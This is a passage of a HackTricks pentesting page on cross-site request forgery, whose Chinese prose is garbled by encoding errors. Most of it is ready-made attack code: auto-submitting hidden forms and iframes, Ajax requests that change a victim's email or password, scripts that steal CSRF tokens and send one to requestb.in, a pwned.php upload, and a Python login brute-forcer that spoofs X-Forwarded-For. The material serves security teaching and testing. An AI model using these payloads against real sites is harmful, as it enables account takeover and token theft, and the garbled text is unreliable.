<pre><code class="language-xml">&lt;meta name="referrer" content="never"&gt;
</code></pre>
<p>è¿™ç¡®ä¿äº†â€œRefererâ€å¤´è¢«çœç•¥ï¼Œä»è€Œå¯èƒ½ç»•è¿‡æŸäº›åº”ç”¨ç¨‹åºä¸­çš„éªŒè¯æ£€æŸ¥ã€‚</p>
<p><strong>æ­£åˆ™è¡¨è¾¾å¼ç»•è¿‡</strong></p>
<p>{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
<a href="ssrf-server-side-request-forgery/url-format-bypass.html">url-format-bypass.md</a>
{% endcontent-ref %}</p>
<p>è¦åœ¨Referrerå°†è¦åœ¨å‚æ•°ä¸­å‘é€çš„URLä¸­è®¾ç½®æœåŠ¡å™¨çš„åŸŸåï¼Œå¯ä»¥æ‰§è¡Œï¼š</p>
<pre><code class="language-html">&lt;html&gt;
&lt;!-- Referrer policy needed to send the qury parameter in the referrer --&gt;
&lt;head&gt;&lt;meta name="referrer" content="unsafe-url"&gt;&lt;/head&gt;
&lt;body&gt;
&lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;
&lt;form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST"&gt;
&lt;input type="hidden" name="email" value="asd&amp;#64;asd&amp;#46;asd" /&gt;
&lt;input type="submit" value="Submit request" /&gt;
&lt;/form&gt;
&lt;script&gt;
// You need to set this or the domain won't appear in the query of the referer header
history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
document.forms[0].submit();
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="head-æ–¹æ³•ç»•è¿‡"><a class="header" href="#head-æ–¹æ³•ç»•è¿‡"><strong>HEAD æ–¹æ³•ç»•è¿‡</strong></a></h3>
<p><a href="https://github.com/google/google-ctf/tree/master/2023/web-vegsoda/solution"><strong>è¿™ä¸ª CTF æ–‡ç« </strong></a>çš„ç¬¬ä¸€éƒ¨åˆ†è§£é‡Šäº†<a href="https://github.com/oakserver/oak/blob/main/router.ts#L281">Oak çš„æºä»£ç </a>ï¼Œä¸€ä¸ªè·¯ç”±å™¨è¢«è®¾ç½®ä¸º<strong>å°† HEAD è¯·æ±‚ä½œä¸º GET è¯·æ±‚å¤„ç†</strong>ï¼Œä¸”æ²¡æœ‰å“åº”ä½“â€”â€”è¿™æ˜¯ä¸€ç§å¸¸è§çš„å˜é€šæ–¹æ³•ï¼Œå¹¶ä¸æ˜¯ Oak ç‹¬æœ‰çš„ã€‚å®ƒä»¬å¹¶æ²¡æœ‰ç‰¹å®šçš„å¤„ç†ç¨‹åºæ¥å¤„ç† HEAD è¯·æ±‚ï¼Œè€Œæ˜¯<strong>ç›´æ¥äº¤ç»™ GET å¤„ç†ç¨‹åºï¼Œä½†åº”ç”¨ç¨‹åºåªæ˜¯ç§»é™¤äº†å“åº”ä½“</strong>ã€‚</p>
<p>å› æ­¤ï¼Œå¦‚æœ GET è¯·æ±‚å—åˆ°é™åˆ¶ï¼Œä½ å¯ä»¥<strong>å‘é€ä¸€ä¸ªå°†è¢«å¤„ç†ä¸º GET è¯·æ±‚çš„ HEAD è¯·æ±‚</strong>ã€‚</p>
<h2 id="åˆ©ç”¨ç¤ºä¾‹"><a class="header" href="#åˆ©ç”¨ç¤ºä¾‹"><strong>åˆ©ç”¨ç¤ºä¾‹</strong></a></h2>
<h3 id="æå–-csrf-ä»¤ç‰Œ"><a class="header" href="#æå–-csrf-ä»¤ç‰Œ"><strong>æå– CSRF ä»¤ç‰Œ</strong></a></h3>
<p>å¦‚æœä½¿ç”¨äº†<strong>CSRF ä»¤ç‰Œ</strong>ä½œä¸º<strong>é˜²å¾¡</strong>ï¼Œä½ å¯ä»¥å°è¯•é€šè¿‡åˆ©ç”¨<a href="xss-cross-site-scripting/#xss-stealing-csrf-tokens"><strong>XSS</strong></a>æ¼æ´æˆ–<a href="dangling-markup-html-scriptless-injection/"><strong>æ‚¬æŒ‚æ ‡è®°</strong></a>æ¼æ´æ¥<strong>æå–å®ƒ</strong>ã€‚</p>
<h3 id="ä½¿ç”¨-html-æ ‡ç­¾çš„-get"><a class="header" href="#ä½¿ç”¨-html-æ ‡ç­¾çš„-get"><strong>ä½¿ç”¨ HTML æ ‡ç­¾çš„ GET</strong></a></h3>
<pre><code class="language-xml">&lt;img src="http://google.es?param=VALUE" style="display:none" /&gt;
&lt;h1&gt;404 - Page not found&lt;/h1&gt;
The URL you are requesting is no longer available
</code></pre>
<p>å…¶ä»–å¯ä»¥ç”¨äºè‡ªåŠ¨å‘é€ GET è¯·æ±‚çš„ HTML5 æ ‡ç­¾åŒ…æ‹¬ï¼š</p>
<pre><code class="language-html">&lt;iframe src="..."&gt;&lt;/iframe&gt;
&lt;script src="..."&gt;&lt;/script&gt;
&lt;img src="..." alt=""&gt;
&lt;embed src="..."&gt;
&lt;audio src="..."&gt;
&lt;video src="..."&gt;
&lt;source src="..." type="..."&gt;
&lt;video poster="..."&gt;
&lt;link rel="stylesheet" href="..."&gt;
&lt;object data="..."&gt;
&lt;body background="..."&gt;
&lt;div style="background: url('...');"&gt;&lt;/div&gt;
&lt;style&gt;
body { background: url('...'); }
&lt;/style&gt;
&lt;bgsound src="..."&gt;
&lt;track src="..." kind="subtitles"&gt;
&lt;input type="image" src="..." alt="Submit Button"&gt;
</code></pre>
<h3 id="è¡¨å•-get-è¯·æ±‚"><a class="header" href="#è¡¨å•-get-è¯·æ±‚">è¡¨å• GET è¯·æ±‚</a></h3>
<pre><code class="language-html">&lt;html&gt;
&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;
&lt;body&gt;
&lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;
&lt;form method="GET" action="https://victim.net/email/change-email"&gt;
&lt;input type="hidden" name="email" value="some@email.com" /&gt;
&lt;input type="submit" value="Submit request" /&gt;
&lt;/form&gt;
&lt;script&gt;
document.forms[0].submit();
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="è¡¨å•-post-è¯·æ±‚"><a class="header" href="#è¡¨å•-post-è¯·æ±‚">è¡¨å• POST è¯·æ±‚</a></h3>
<pre><code class="language-html">&lt;html&gt;
&lt;body&gt;
&lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;
&lt;form method="POST" action="https://victim.net/email/change-email" id="csrfform"&gt;
&lt;input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /&gt; &lt;!-- Way 1 to autosubmit --&gt;
&lt;input type="submit" value="Submit request" /&gt;
&lt;img src=x onerror="csrfform.submit();" /&gt; &lt;!-- Way 2 to autosubmit --&gt;
&lt;/form&gt;
&lt;script&gt;
document.forms[0].submit(); //Way 3 to autosubmit
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="é€šè¿‡-iframe-å‘é€è¡¨å•-post-è¯·æ±‚"><a class="header" href="#é€šè¿‡-iframe-å‘é€è¡¨å•-post-è¯·æ±‚">é€šè¿‡ iframe å‘é€è¡¨å• POST è¯·æ±‚</a></h3>
<pre><code class="language-html">&lt;!--
The request is sent through the iframe withuot reloading the page
--&gt;
&lt;html&gt;
&lt;body&gt;
&lt;iframe style="display:none" name="csrfframe"&gt;&lt;/iframe&gt;
&lt;form method="POST" action="/change-email" id="csrfform" target="csrfframe"&gt;
&lt;input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /&gt;
&lt;input type="submit" value="Submit request" /&gt;
&lt;/form&gt;
&lt;script&gt;
document.forms[0].submit();
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="ajax-post-è¯·æ±‚"><a class="header" href="#ajax-post-è¯·æ±‚"><strong>Ajax POST è¯·æ±‚</strong></a></h3>
<pre><code class="language-html">&lt;script&gt;
var xh;
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
xh=new XMLHttpRequest();
}
else
{// code for IE6, IE5
xh=new ActiveXObject("Microsoft.XMLHTTP");
}
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&amp;status=on");
&lt;/script&gt;

&lt;script&gt;
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&amp;param2=value2"
})
&lt;/script&gt;
</code></pre>
<h3 id="multipartform-data-post-è¯·æ±‚"><a class="header" href="#multipartform-data-post-è¯·æ±‚">multipart/form-data POST è¯·æ±‚</a></h3>
<pre><code class="language-javascript">myFormData = new FormData();
var blob = new Blob(["&lt;?php phpinfo(); ?&gt;"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: {"Content-Type": "application/x-www-form-urlencoded"},
mode: "no-cors"
});
</code></pre>
<h3 id="multipartform-data-post-è¯·æ±‚-v2"><a class="header" href="#multipartform-data-post-è¯·æ±‚-v2">multipart/form-data POST è¯·æ±‚ v2</a></h3>
<pre><code class="language-javascript">// https://www.exploit-db.com/exploits/20009
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
</code></pre>
<h3 id="ä»-iframe-å†…éƒ¨å‘é€è¡¨å•-post-è¯·æ±‚"><a class="header" href="#ä»-iframe-å†…éƒ¨å‘é€è¡¨å•-post-è¯·æ±‚">ä» iframe å†…éƒ¨å‘é€è¡¨å• POST è¯·æ±‚</a></h3>
<pre><code class="language-html">&lt;--! expl.html --&gt;

&lt;body onload="envia()"&gt;
&lt;form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php"&gt;
&lt;input type="text" id="pwd" name="pwd" value="otra nueva"&gt;
&lt;/form&gt;
&lt;body&gt;
&lt;script&gt;
function envia(){document.getElementById("formulario").submit();}
&lt;/script&gt;

&lt;!-- public.html --&gt;
&lt;iframe src="2-1.html" style="position:absolute;top:-5000"&gt;
&lt;/iframe&gt;
&lt;h1&gt;Sitio bajo mantenimiento. Disculpe las molestias&lt;/h1&gt;
</code></pre>
<h3 id="çªƒå–-csrf-ä»¤ç‰Œå¹¶å‘é€-post-è¯·æ±‚"><a class="header" href="#çªƒå–-csrf-ä»¤ç‰Œå¹¶å‘é€-post-è¯·æ±‚"><strong>çªƒå– CSRF ä»¤ç‰Œå¹¶å‘é€ POST è¯·æ±‚</strong></a></h3>
<pre><code class="language-javascript">function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest();
xhr.open("POST", POST_URL, true);
xhr.withCredentials = true;

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

// This is for debugging and can be removed
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE &amp;&amp; xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&amp;otherparama=heyyyy");
}

function getTokenJS() {
var xhr = new XMLHttpRequest();
// This tels it to return it as a HTML document
xhr.responseType = "document";
xhr.withCredentials = true;
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true);
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE &amp;&amp; xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token");
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value);
}
};
// Make the request
xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
</code></pre>
<h3 id="çªƒå–-csrf-ä»¤ç‰Œå¹¶ä½¿ç”¨-iframeè¡¨å•å’Œ-ajax-å‘é€-post-è¯·æ±‚"><a class="header" href="#çªƒå–-csrf-ä»¤ç‰Œå¹¶ä½¿ç”¨-iframeè¡¨å•å’Œ-ajax-å‘é€-post-è¯·æ±‚"><strong>çªƒå– CSRF ä»¤ç‰Œå¹¶ä½¿ç”¨ iframeã€è¡¨å•å’Œ Ajax å‘é€ Post è¯·æ±‚</strong></a></h3>
<pre><code class="language-html">&lt;form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data"&gt;
&lt;input type="text" name="username" value="AA"&gt;
&lt;input type="checkbox" name="status" checked="checked"&gt;
&lt;input id="token" type="hidden" name="token" value="" /&gt;
&lt;/form&gt;

&lt;script type="text/javascript"&gt;
function f1(){
x1=document.getElementById("i1");
x1d=(x1.contentWindow||x1.contentDocument);
t=x1d.document.getElementById("token").value;

document.getElementById("token").value=t;
document.getElementById("form1").submit();
}
&lt;/script&gt;
&lt;iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"&gt;&lt;/iframe&gt;
</code></pre>
<h3 id="çªƒå–-csrf-ä»¤ç‰Œå¹¶ä½¿ç”¨-iframe-å’Œè¡¨å•å‘é€-post-è¯·æ±‚"><a class="header" href="#çªƒå–-csrf-ä»¤ç‰Œå¹¶ä½¿ç”¨-iframe-å’Œè¡¨å•å‘é€-post-è¯·æ±‚"><strong>çªƒå– CSRF ä»¤ç‰Œå¹¶ä½¿ç”¨ iframe å’Œè¡¨å•å‘é€ POST è¯·æ±‚</strong></a></h3>
<pre><code class="language-html">&lt;iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"&gt;&lt;/iframe&gt;

&lt;script&gt;
function read()
{
var name = 'admin2';
var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
document.writeln('&lt;form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data"&gt;');
document.writeln('&lt;input id="username" type="text" name="username" value="' + name + '" /&gt;&lt;br /&gt;');
document.writeln('&lt;input id="token" type="hidden" name="token" value="' + token + '" /&gt;');
document.writeln('&lt;input type="submit" name="submit" value="Submit" /&gt;&lt;br/&gt;');
document.writeln('&lt;/form&gt;');
document.forms[0].submit.click();
}
&lt;/script&gt;
</code></pre>
<h3 id="çªƒå–ä»¤ç‰Œå¹¶ä½¿ç”¨-2-ä¸ª-iframe-å‘é€"><a class="header" href="#çªƒå–ä»¤ç‰Œå¹¶ä½¿ç”¨-2-ä¸ª-iframe-å‘é€"><strong>çªƒå–ä»¤ç‰Œå¹¶ä½¿ç”¨ 2 ä¸ª iframe å‘é€</strong></a></h3>
<pre><code class="language-html">&lt;script&gt;
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
&lt;/script&gt;

&lt;iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"&gt;&lt;/iframe&gt;

&lt;iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"&gt;&lt;/iframe&gt;
&lt;body onload="document.forms[0].submit()"&gt;
&lt;form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data"&gt;
&lt;input type="text" name="username" value="z"&gt;
&lt;input type="checkbox" name="status" checked=""&gt;
&lt;input id="token" type="hidden" name="token" value="0000" /&gt;
&lt;button type="submit"&gt;Submit&lt;/button&gt;
&lt;/form&gt;
</code></pre>
<h3 id="posté€šè¿‡ajaxçªƒå–csrfä»¤ç‰Œå¹¶ä½¿ç”¨è¡¨å•å‘é€post"><a class="header" href="#posté€šè¿‡ajaxçªƒå–csrfä»¤ç‰Œå¹¶ä½¿ç”¨è¡¨å•å‘é€post"><strong>POSTé€šè¿‡Ajaxçªƒå–CSRFä»¤ç‰Œå¹¶ä½¿ç”¨è¡¨å•å‘é€POST</strong></a></h3>
<pre><code class="language-html">&lt;body onload="getData()"&gt;

&lt;form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data"&gt;
&lt;input type="hidden" name="username" value="root"/&gt;
&lt;input type="hidden" name="status" value="on"/&gt;
&lt;input type="hidden" id="findtoken" name="token" value=""/&gt;
&lt;input type="submit" value="valider"/&gt;
&lt;/form&gt;

&lt;script&gt;
var x = new XMLHttpRequest();
function getData() {
x.withCredentials = true;
x.open("GET","http://google.com?param=VALUE",true);
x.send(null);
}
x.onreadystatechange = function() {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1];
document.getElementById("findtoken").value = token;
document.getElementById("form").submit();
}
}
&lt;/script&gt;
</code></pre>
<h3 id="csrfä¸socketio"><a class="header" href="#csrfä¸socketio">CSRFä¸Socket.IO</a></h3>
<pre><code class="language-html">&lt;script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"&gt;&lt;/script&gt;
&lt;script&gt;
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () =&gt; {
console.log('connected!');
socket.emit('join', {
room: username
});
socket.emit('my_room_event', {
data: '!flag',
room: username
})

});
&lt;/script&gt;
</code></pre>
<h2 id="csrf-ç™»å½•æš´åŠ›ç ´è§£"><a class="header" href="#csrf-ç™»å½•æš´åŠ›ç ´è§£">CSRF ç™»å½•æš´åŠ›ç ´è§£</a></h2>
<p>è¯¥ä»£ç å¯ç”¨äºé€šè¿‡ CSRF ä»¤ç‰Œå¯¹ç™»å½•è¡¨å•è¿›è¡Œæš´åŠ›ç ´è§£ï¼ˆå®ƒè¿˜ä½¿ç”¨äº† X-Forwarded-For å¤´æ¥å°è¯•ç»•è¿‡å¯èƒ½çš„ IP é»‘åå•ï¼‰ï¼š</p>
<pre><code class="language-python">import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
</code></pre>
<h2 id="tools"><a class="header" href="#tools">Tools <a href="#tools" id="tools"></a></a></h2>
<ul>
<li><a href="https://github.com/0xInfection/XSRFProbe">https://github.com/0xInfection/XSRFProbe</a></li>
<li><a href="https://github.com/merttasci/csrf-poc-generator">https://github.com/merttasci/csrf-poc-generator</a></li>
</ul>
<h2 id="references"><a class="header" href="#references">References</a></h2>
<ul>
<li><a href="https://portswigger.net/web-security/csrf">https://portswigger.net/web-security/csrf</a></li>
<li><a href="https://portswigger.net/web-security/csrf/bypassing-token-validation">https://portswigger.net/web-security/csrf/bypassing-token-validation</a></li>
<li><a href="https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses">https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses</a></li>
<li><a href="https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html">https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html</a></li>
</ul>
<p>â€‹</p>
<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
<p>åŠ å…¥ <a href="https://discord.com/invite/N3FrSbmwdy"><strong>HackenProof Discord</strong></a> æœåŠ¡å™¨ï¼Œä¸ç»éªŒä¸°å¯Œçš„é»‘å®¢å’Œæ¼æ´èµé‡‘çŒäººäº¤æµï¼</p>
<p><strong>é»‘å®¢è§è§£</strong><br />
å‚ä¸æ·±å…¥æ¢è®¨é»‘å®¢çš„åˆºæ¿€ä¸æŒ‘æˆ˜çš„å†…å®¹</p>
<p><strong>å®æ—¶é»‘å®¢æ–°é—»</strong><br />
é€šè¿‡å®æ—¶æ–°é—»å’Œè§è§£ï¼Œè·Ÿä¸Šå¿«é€Ÿå˜åŒ–çš„é»‘å®¢ä¸–ç•Œ</p>
<p><strong>æœ€æ–°å…¬å‘Š</strong><br />
äº†è§£æœ€æ–°çš„æ¼æ´èµé‡‘è®¡åˆ’å’Œé‡è¦å¹³å°æ›´æ–°</p>
<p><strong>åŠ å…¥æˆ‘ä»¬</strong> <a href="https://discord.com/invite/N3FrSbmwdy"><strong>Discord</strong></a>ï¼Œä»Šå¤©å°±å¼€å§‹ä¸é¡¶çº§é»‘å®¢åˆä½œï¼</p>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š <img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>ç”µæŠ¥ç¾¤ç»„</strong></a> æˆ– <strong>åœ¨</strong> <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a>** ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚**</li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../pentesting-web/crlf-0d-0a.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../pentesting-web/dangling-markup-html-scriptless-injection/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../pentesting-web/crlf-0d-0a.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../pentesting-web/dangling-markup-html-scriptless-injection/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../elasticlunr.min.js"></script>
        <script src="../mark.min.js"></script>
        <script src="../searcher.js"></script>

        <script src="../clipboard.min.js"></script>
        <script src="../highlight.js"></script>
        <script src="../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
